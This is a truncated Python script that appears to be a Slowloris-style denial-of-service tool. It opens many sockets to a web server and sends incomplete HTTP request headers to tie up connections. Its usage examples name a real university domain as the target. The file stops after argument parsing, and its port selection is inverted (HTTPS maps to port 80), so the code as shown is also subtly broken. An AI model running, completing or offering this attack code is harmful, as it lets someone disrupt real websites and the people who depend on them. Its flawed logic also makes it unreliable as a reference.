import socket
import random
import sys

headers = [
    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Accept-Language: en-US,en;q=0.5",
    "Connection: keep-alive"
]

# Used in formating the requests
base_request = "GET /?{} HTTP/1.1\r\n"
preceding_request = '{}\r\n'


def gen_socket(ip, https=True) -> socket:
    # This is the deafult web HTTPS port
    int: port = 443
    if https:
        # This is the deafult web HTTP port
        port = 80

    # Setting up the socket we're going to use to connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))

    int: rand_int = random.randint(0, 2000)
    request = base_request.format(rand_int).encode('UTF-8')
    s.send(request)

    for header in headers:
        r = preceding_request.format(header).encode('UTF-8')
        s.send(r)

    return s


if __name__ == "__main__":
    if len(sys.argv) < 5:
        # Invalid use prints usage
        print(
            "Usage:\tpython {} <website/ip> <http or https> <# of sockets> <timeout>\n".format(sys.argv[0]))
        print("Ex.:\t{} floridapoly.edu http 100 10".format(sys.argv[0]))
        print("\t{} floridapoly.edu https 150 5".format(sys.argv[0]))
        exit(1)

    ip = sys.argv[1]
    port_type = sys.argv[2]
    num_sockets = int(sys.argv[3])
    time = int(sys.argv[4])
